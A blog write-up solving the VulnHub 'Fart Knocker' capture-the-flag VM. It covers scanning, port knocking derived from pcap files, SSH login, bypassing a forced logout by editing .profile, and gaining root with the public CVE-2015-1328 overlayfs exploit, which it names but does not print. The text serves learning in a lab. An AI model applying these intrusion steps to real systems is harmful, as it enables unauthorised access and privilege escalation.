I continued to play with the vulnhub virtual machine an started the
[TopHatSec - Fart Knocker](https://www.vulnhub.com/entry/tophatsec-fartknocker,115/).
This VM is an Ubuntu 14.04 32 bits.

The goal of this challenge is to break into the machine and root it.

>P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
>day. Otherwise you kids might not understand :)

<!-- PELICAN_END_SUMMARY -->

# Discovery

First of all we determine the VM IP address a with a simple `nmap -sP`.

## Nmap

As always we start by [nmaping](http://nmap.org/) the server in order to see the open ports:

    [maggick@arch FartKnocker]$ nmap -A 10.0.2.6
    # Nmap 6.47 scan initiated Thu Apr 23 16:21:05 2015 as: nmap -oA nmap -A 10.0.2.6
    Nmap scan report for 10.0.2.6
    Host is up (0.0034s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html).

    Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    # Nmap done at Thu Apr 23 16:21:12 2015 -- 1 IP address (1 host up) scanned in 6.98 seconds

Only the port 80 is open with an HTTP server.

As always I had launch a [nikto](https://cirt.net/nikto2) against the server
but no interesting result.

# Exploitation

We go to the web page and only found a pcap file which is a capture of some
network traffic.

## pcap1

We analyse the `pcap1.pcap` file. The packets and the VM name leads us to ports
knocking. As I do not know anything about it I have done some research on internet to
understand the principle (which is quite simple: send packets to a ports sequence
will open an other port) and fund a
[basic script to knock](https://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/).
I adapt it to my need and launch it against the target. The script will knock on
the sequence ports extract from the pcap file (it is quite simple to read with
[wireshark](https://www.wireshark.org/)):

    [maggick@arch FartKnocker]$ sudo python2 script.py
    WARNING: No route found for IPv6 destination :: (no default route?)
    [*] Knocking on 10.0.2.6:7000

    [*] Knocking on 10.0.2.6:9000
    [*] Knocking on 10.0.2.6:8888
    [*] Scanning for open ports using nmap

A [nmap](http://nmap.org/) scan is launched after the knocking sequence to see
what port will open:

    Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 16:35 CEST
    Nmap scan report for 10.0.2.6
    Host is up (0.00060s latency).

    Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds

This port run an other HTTP service which give us a second url `/burgerworld`
and a second pcap file.

## pcap2

After trying a bit to replay and understand the file I used the follow  TCP
stream function from [wireshark](https://www.wireshark.org), and the following
appears:

![eins drei drei sieben](/media/2015.06/beavis.jpg)

**eins drei drei sieben** means one, three, three, seven (7 years of German at least
useful, well it was of some use during the NDH qualifications too).

Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
other URL: `/iamcornholio/`. We got some code looking like base64.

## base64

The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:

    nc 10.0.2.6 8888
    nc 10.0.2.6 9999
    nc 10.0.2.6 7777
    nc 10.0.2.6 6666

Once more we launch nmap to see if a port was opened:

    [maggick@arch FartKnocker]$ nmap  -A 10.0.2.6

    Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 13:32 CEST

Well, the ssh port 22 is now open.

## SSH

We try to connect to it:

    :::text
    [maggick@arch FartKnocker]$ ssh 10.0.2.6
    The authenticity of host '10.0.2.6 (10.0.2.6)' can't be established.
    ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '10.0.2.6' (ECDSA) to the list of known hosts.
    ############################################

The password and username are given by the ssh message, we should use them
directly:


    :::text
    [maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead
    ############################################

    butthead@10.0.2.6's password:
    Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)

    Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
    You are only logging in for a split second! What do you do!

We got an ssh connection but we are logout immediately.

*I will no more put the CONGRATS message for your own sanity.*

We execute a command directly within the ssh command (a classic ssh feature):

    :::text
    [maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead ls
    nachos

The commands is executed, my first reaction was to read `/etc/passwd/` as the
flag was there in
[the last TopHatSec challenge](http://maggick.fr/2015/04/vulnhub-freshly.html)
but this is not so simple this time. Nevertheless we can get a shell buy using
`/bin/bash/`. We read the `nachos` file in buttheads's home:

    :::text
    cat nachos
    Great job on getting this far.

    Can you login as beavis or root ?

The next step seems to get a beavis or root shell from the butthead one. This a
privilege escalation.

## Guessing

**Disclaimer:** during my long guessing period for privilege escalation I looked at
the other writeup to see if I missed something but they all used password
bruteforce. I do not like bruteforce, so I continue looking for something else.

This part was the hardest of this challenge. It take me three weeks (not at full
time of course) to get over with it. I will give you some of my guessing steps:

First of all to get a shell we just need to modify the `.profil` file:

    sed 's/exit//' -i .profile

Let see what there is in beavis' home:

    :::text
    ls /home/beavis
    html
    nc1.sh
    ncone
    nctwo

There was a lot of netcat scripts but none of them allow us to make our privilege
escalation.

Looking for a solution to get login as beavis, we notice that there was more
pcap files at our disposal :

    :::text
    ls /var/www/html -R
    /var/www/html:
    burgerworld
    iamcornholio
    index.html
    pcap1.pcap
    spanishfly

    /var/www/html/burgerworld:
    index.html
    pcap2.pcap

    /var/www/html/iamcornholio:
    index.html
    pcap3.pcap

    /var/www/html/spanishfly:
    pcap4.pcap

Even more troll: there is a folder `/var/backups/` containing backups from the
`/etc/shadow` file (which could be useful to crack the password):

    butthead@Huhuhhhhhuhuhhh:~$ ls -la /var/backups/
    total 4872
    drwxr-xr-x  2 root root      4096 Apr 28 06:25 .
    drwxr-xr-x 12 root root      4096 Mar  2 17:45 ..
    -rw-r--r--  1 root root      7380 Mar  2 23:39 apt.extended_states.0
    -rw-r--r--  1 root root   4516724 Mar  2 16:45 aptitude.pkgstates.0
    -rw-r--r--  1 root root    437586 Mar  2 23:39 dpkg.status.0
    -rw-------  1 root root       690 Mar  3 00:30 group.bak
    -rw-------  1 root shadow     577 Mar  3 00:30 gshadow.bak
    -rw-------  1 root root      1143 Mar  3 00:30 passwd.bak
    -rw-------  1 root shadow     939 Mar  3 00:30 shadow.bak

This backups are copied by the daily crontab. A solution may be to attempt to a
race condition against it. I have not dig into the subject.

I also used
[unix-privsec-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
in order to search for the privilege escalation.

## CVE-2015-1328

I had a bit stop to search for the privilege escalation when I saw that an
exploit as been published for the
[CVE-2015-1328](http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html),
which use the incorrect permission check in overlayfs in Ubuntu to give root
privileges: [http://seclists.org/oss-sec/2015/q2/717](http://seclists.org/oss-sec/2015/q2/717)

Hopefully we are on a vulnerable Ubuntu. So I compiled `ofs.c` with `gcc` and
launch it, well it works and give me immediately a root shell.

    root@Huhuhhhhhuhuhhh:/home/butthead# cat /root/SECRETZ
    You have done a great job, if you can see this, please shoot me an email
    and let me know that you have beat this box!

# Conclusion

This was a nice challenge as I learned a lot about the port knocking. The
privilege escalation was quit interesting to search for and the CVE-2015-1328
exploitation was a lot of fun.

Thank you [top-hat-sec](http://top-hat-sec.com) for this challenge and
[vulnhub](http://vulnhub.com) as always.
